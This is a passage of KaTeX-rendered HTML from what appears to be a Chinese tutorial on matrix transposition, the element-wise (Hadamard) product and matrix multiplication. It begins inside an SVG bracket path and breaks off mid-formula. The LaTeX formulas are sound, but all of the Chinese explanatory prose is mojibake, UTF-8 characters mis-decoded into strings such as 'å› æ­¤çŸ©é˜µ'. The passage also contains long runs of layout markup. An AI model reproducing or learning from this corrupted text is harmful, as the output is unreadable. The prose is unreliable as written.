d="M76,0c-16.7,0,-25,3,-25,9c0,2,2,6.3,6,13c21.3,28.7,42.3,60.3,63,95c96.7,156.7,172.8,332.5,228.5,527.5c55.7,195,92.8,416.5,111.5,664.5c11.3,139.3,17,290.7,17,454c0,28,1.7,43,3.3,45l0,9c-3,4,-3.3,16.7,-3.3,38c0,162,-5.7,313.7,-17,455c-18.7,248,-55.8,469.3,-111.5,664c-55.7,194.7,-131.8,370.3,-228.5,527c-20.7,34.7,-41.7,66.3,-63,95c-2,3.3,-4,7,-6,11c0,7.3,5.7,11,17,11c0,0,11,0,11,0c9.3,0,14.3,-0.3,15,-1c5.3,-5.3,10.3,-11,15,-17c242.7,-294.7,395.3,-681.7,458,-1161c21.3,-164.7,33.3,-350.7,36,-558l0,-144c-2,-159.3,-10,-310.7,-24,-454c-53.3,-528,-210,-949.7,-470,-1265c-4.7,-6,-9.7,-11.7,-15,-17c-0.7,-0.7,-6.7,-1,-18,-1z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><p>å› æ­¤çŸ©é˜µè½¬ç½®å®é™…ä¸Šå°±æ˜¯è°ƒæ¢ä¸€ä¸‹nå’Œmã€‚é‚£ä¹ˆçŸ©é˜µçš„ç‚¹ä¹˜åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>é¦–å…ˆçŸ©é˜µçš„ç‚¹ä¹˜éœ€è¦çŸ©é˜µçš„è¡Œåˆ—ç›¸ç­‰ï¼Œå…¶æ¬¡è¿ç®—æ—¶å°±æ˜¯å¯¹åº”é¡¹ç›¸ä¹˜ä¾‹å¦‚</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mo>âŠ™</mo><mi>B</mi><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>13</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>23</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>âŠ™</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>13</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>23</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>11</mn></msub><mo>â‹…</mo><msub><mi>b</mi><mn>11</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>12</mn></msub><mo>â‹…</mo><msub><mi>b</mi><mn>12</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>13</mn></msub><mo>â‹…</mo><msub><mi>b</mi><mn>13</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>21</mn></msub><mo>â‹…</mo><msub><mi>b</mi><mn>21</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>22</mn></msub><mo>â‹…</mo><msub><mi>b</mi><mn>22</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>23</mn></msub><mo>â‹…</mo><msub><mi>b</mi><mn>23</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">A \odot B = \begin{pmatrix}    a_{11} &amp; a_{12} &amp; a_{13} \\    a_{21} &amp; a_{22} &amp; a_{23} \\\end{pmatrix}\odot\begin{pmatrix}    b_{11} &amp; b_{12} &amp; b_{13} \\    b_{21} &amp; b_{22} &amp; b_{23} \\\end{pmatrix}=\begin{pmatrix}    a_{11} \cdot b_{11} &amp; a_{12} \cdot b_{12} &amp; a_{13} \cdot b_{13} \\    a_{21} \cdot b_{21} &amp; a_{22} \cdot b_{22} &amp; a_{23} \cdot b_{23} \\\end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âŠ™</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âŠ™</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span></span></p><p>ä½†æ˜¯è¿™é“é¢˜æ¯”è¾ƒç®€å•çš„æ˜¯Wæ˜¯ä¸ªä¸€ç»´å‘é‡ã€‚ä¹Ÿå°±æ˜¯æ ¹æ®é¢˜ç›®æ‰€è¯´å°†çŸ©é˜µä¸­çš„ç¬¬<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span>è¡Œä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">W^{(i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span>ç›¸ä¹˜ï¼Œæ‰€ä»¥è¿™éƒ¨åˆ†å°±å˜ç®€å•äº†ã€‚</p><p>çŸ©é˜µçš„å‰ä¹˜å°±æ¯”è¾ƒå¤æ‚äº†ï¼Œæˆ‘ä»¬è¿˜æ˜¯ä¸¾ä¸ªä¾‹å­</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mo>Ã—</mo><mi>B</mi><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>13</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>23</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>Ã—</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>12</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>22</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>31</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>32</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>11</mn></msub><msub><mi>b</mi><mn>11</mn></msub><mo>+</mo><msub><mi>a</mi><mn>12</mn></msub><msub><mi>b</mi><mn>21</mn></msub><mo>+</mo><msub><mi>a</mi><mn>13</mn></msub><msub><mi>b</mi><mn>31</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>11</mn></msub><msub><mi>b</mi><mn>12</mn></msub><mo>+</mo><msub><mi>a</mi><mn>12</mn></msub><msub><mi>b</mi><mn>22</mn></msub><mo>+</mo><msub><mi>a</mi><mn>13</mn></msub><msub><mi>b</mi><mn>32</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>21</mn></msub><msub><mi>b</mi><mn>11</mn></msub><mo>+</mo><msub><mi>a</mi><mn>22</mn></msub><msub><mi>b</mi><mn>21</mn></msub><mo>+</mo><msub><mi>a</mi><mn>23</mn></msub><msub><mi>b</mi><mn>31</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>21</mn></msub><msub><mi>b</mi><mn>12</mn></msub><mo>+</mo><msub><mi>a</mi><mn>22</mn></msub><msub><mi>b</mi><mn>22</mn></msub><mo>+</mo><msub><mi>a</mi><mn>23</mn></msub><msub><mi>b</mi><mn>32</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">A \times B = \begin{pmatrix}    a_{11} &amp; a_{12} &amp; a_{13} \\    a_{21} &amp; a_{22} &amp; a_{23} \\\end{pmatrix}\times\begin{pmatrix}    b_{11} &amp; b_{12} \\    b_{21} &amp; b_{22} \\    b_{31} &amp; b_{32} \\\end{pmatrix}=\begin{pmatrix}    a_{11}b_{11} + a_{12}b_{21} + a_{13}b_{31} &amp; a_{11}b_{12} + a_{12}b_{22} + a_{13}b_{32} \\    a_{21}b_{11} + a_{22}b_{21} + a_{23}b_{31} &amp; a_{21}b_{12} + a_{22}b_{22} + a_{23}b_{32} 